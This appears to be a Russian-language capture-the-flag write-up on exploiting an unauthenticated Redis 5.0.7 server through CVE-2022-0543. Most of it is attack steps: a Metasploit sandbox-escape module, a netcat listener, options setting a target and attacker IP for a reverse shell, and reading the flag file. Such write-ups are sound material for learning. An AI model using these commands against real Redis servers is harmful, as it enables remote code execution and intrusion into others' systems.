# Редиска

Flask-приложение с Redis. Имитация старой системы "Enterprise Logic Pro 2000". 
Сразу обращаем внимание на версию Redis, используемую на сервере. Это Redis 5.0.7. 
Он не защищен паролем (requirepass пустой), что позволяет любому пользователю 
отправлять команды без аутентификации, но флага там нет.

Эта версия Redis уязвима к [CVE-2022-0543](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md). Это критическая RCE-уязвимость в Redis 
для Debian и Ubuntu, позволяющая выполнить произвольный код на сервере через обход 
ограничений Lua-песочницы.

```bash
msfconsole
use exploit/linux/redis/redis_debian_sandbox_escape
```

На сервере с белым IP открываем listener на 4444 порту

```bash
nc -lvnp 4444
```

```bash
set RHOSTS 94.19.79.169
set RPORT 20004
unset PASSWORD
set LHOST 45.140.19.200
set LUA_LIB /usr/lib/x86_64-linux-gnu/liblua5.1.so.0
set ForceExploit true
```

Получаем rev-shell на тачке с Redis. Флаг находится в корне
```bash
cat ../../flag.txt
```
